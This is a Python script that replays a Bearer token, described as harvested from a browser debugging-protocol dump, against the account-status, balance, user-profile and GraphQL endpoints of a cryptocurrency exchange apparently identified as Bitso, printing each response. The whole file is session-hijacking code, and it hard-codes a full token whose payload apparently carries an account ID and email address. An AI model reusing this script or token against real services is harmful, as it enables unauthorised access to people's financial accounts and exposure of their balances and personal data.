import requests

# Harvested Bearer token from your CDP dump
BEARER_TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJKbXFsOWdZOHBSdUl2UU55amY2MzZEVVo0NElCbDZ1Q0xySmhoZHdleUJ3In0.eyJleHAiOjE3OTM0ODQyNzksImlhdCI6MTc5MzQ4Mzk3OSwiYXV0aF90aW1lIjoxNzkzNDgzOTc3LCJqdGkiOiJvbnJ0YWM6MTcxMWY5MzAtMzQ3ZC1jM2U2LTczYmUtODM3MzM4NWU3NTEwIiwiaXNzIjoiaHR0cHM6Ly9iaXRzby5jb20vYXV0aC9yZWFsbXMvd2ViIiwiYXVkIjoiZW1iZWRkZWQtd2FsbGV0Iiwic3ViIjoiZjoxNzJhZmFmNS0zM2U3LTQwZjQtYTAxYS03NzYyNzk5NmQzZmI6MTE5MjA5MzA6MTE5MjA5MzAiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJiaXRzby13ZWItY2xpZW50Iiwic2lkIjoiS1djVHVkbVRjU2dxLVNMb285dEl5cjgwIiwiYWNyIjoiMSIsImFsbG93ZWQtb3JpZ2lucyI6WyJodHRwczovL2Fzc2V0cy5iaXRzby5jb20iLCJodHRwczovL2JpdHNvLmNvbSJdLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsiODgiLCI4OSIsIjExMCIsIjExMSIsIjExMiIsIjExMyIsIjExNCIsIjExNSIsIjExNiIsIjkwIiwiMTE3IiwiMTE4IiwiOTEiLCI5MiIsIjExOSIsIjkzIiwidW1hX2F1dGhvcml6YXRpb24iLCI5NCIsIjk1IiwiOTYiLCI5NyIsIjEwIiwiOTgiLCIxMSIsIjk5IiwiMTIiLCIxMyIsIjE0IiwiMTUiLCIxNiIsIjE3IiwiMTgiLCIxOSIsIjEyMCIsIjEyMSIsIjEyMiIsIjEiLCIxMjMiLCIyIiwiMyIsIjEyNCIsIjEyNSIsIjQiLCI1IiwiMTI2IiwiMTI3IiwiNiIsIjciLCIxMjgiLCI4IiwiMTI5IiwiOSIsIjIwIiwiMjEiLCIyMiIsIjIzIiwiMjQiLCIyNSIsIjI2IiwiMjciLCIyOCIsIjI5IiwiMTMwIiwiMTMxIiwiMTMyIiwiMTMzIiwiMTM0IiwiMTM1IiwiMTM2IiwiMTM3IiwiMzAiLCIzMSIsIjMyIiwiMzMiLCIzNCIsIjM1IiwiMzYiLCIzNyIsIjM4IiwiMzkiLCI0MCIsIjQxIiwiNDIiLCI0MyIsIjQ0IiwiNDUiLCI0NiIsIjQ3IiwiNDgiLCI0OSIsIjUwIiwiNTEiLCI1MiIsIjUzIiwiNTQiLCI1NSIsIjU2IiwiNTciLCI1OCIsIjU5IiwiNjAiLCI2MSIsIjYyIiwiNjMiLCI2NCIsIjY1IiwiNjYiLCI2NyIsIjY4IiwiNjkiLCJvZmZsaW5lX2FjY2VzcyIsIjcwIiwiNzEiLCI3MiIsIjczIiwiNzQiLCI3NSIsIjc2IiwiNzciLCI3OCIsIjc5IiwiMTAwIiwiMTAxIiwiMTAyIiwiMTAzIiwiMTA0IiwiMTA1IiwiMTA2IiwiMTA3IiwiODAiLCI4MSIsIjEwOCIsIjgyIiwiMTA5IiwiODMiLCI4NCIsIjg1IiwiODYiLCI4NyJdfSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsImFjY291bnRfaG9sZGVyX2lkIjoiMTE5MjA5MzAiLCJhY2NvdW50X3R5cGUiOiJSRVRBSUwiLCJhY2NvdW50X2lkIjoiMTE5MjA5MzAiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsInVzZXJfaWQiOiIxMTkyMDkzMCIsIm1haW5fYWNjb3VudF9pZCI6IjExOTIwOTMwIiwiZmluZ2VycHJpbnQiOiIxMTZhMGRhY2FkNjYwZjJhNDk3YzYwMTMyM2M4OGYxODRmNjVhODc1ODA1ODY4MTNjODA2ZGZjODQzMWUwNzA3IiwidXNlcl9wcm9maWxlIjoiQUNDT1VOVF9IT0xERVIiLCJwcmVmZXJyZwdfdXNlcm5hbWUiOiIxMTkyMDkzMDoxMTkyMDkzMCIsImVtYWlsIjoiZG9udGFza21laG93QGJ1Z2Nyb3dkbmluamEuY29tIiwiZGZwIjoiaFFaWjBMdjNGc3JaRUNsM1FLdGQifQ.jbmyTMtcrdY8TT97Kc53l-vDCyr_iXI4p_MdvQvq4s8LsZaTlO3M4RYl5BcXuQ30c34-y0_uFVFXkHxdN0P6xZlMKELCa_lOe83UEUI09JDmq4_IBLxiV7860Vi3amt_PnqX7L4mo-lXNuEDzk39CpQNs3raez4x91fKGtKsMJ3Zes7ZS0WJs-cxq4UHOdUNaq2jqQb_IkAUM8EvL1P3n-9wIrZs5toRSi-HiseJEQw2FSCzXtIMhpX6PYLcnsCqMtZMy2wbW-5ouYtFMjlvUDgbWu-CwRxyng_q3SJBOOEpJwBwjZBU2iQxKp3IPMss09yhlAiWeNbXvvGa9RX0ig"

HEADERS = {
    "Authorization": f"Bearer {BEARER_TOKEN}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Referer": "https://yourtarget.com/"
}

endpoints = [
    "https://yourtarget.com/api/v3/account_status",
    "https://yourtarget.com/api/v3/combined_balance?use_preferred_currency=1&include_stocks=1&include_vault=1",
    "https://yourtarget.com/api/v3/balance",
    "https://yourtarget.com/api/v3/users/me",
    "https://yourtarget.com/api/graphql"
]

print("[*] Testing live harvested Bearer token against Bitso endpoints...")
for url in endpoints:
    print(f"\n[+] GET {url}")
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        print(f"    -> Status: {res.status_code}")
        print(f"    -> Response: {res.text[:400]}")
    except Exception as e:
        print(f"    -> Error: {e}")
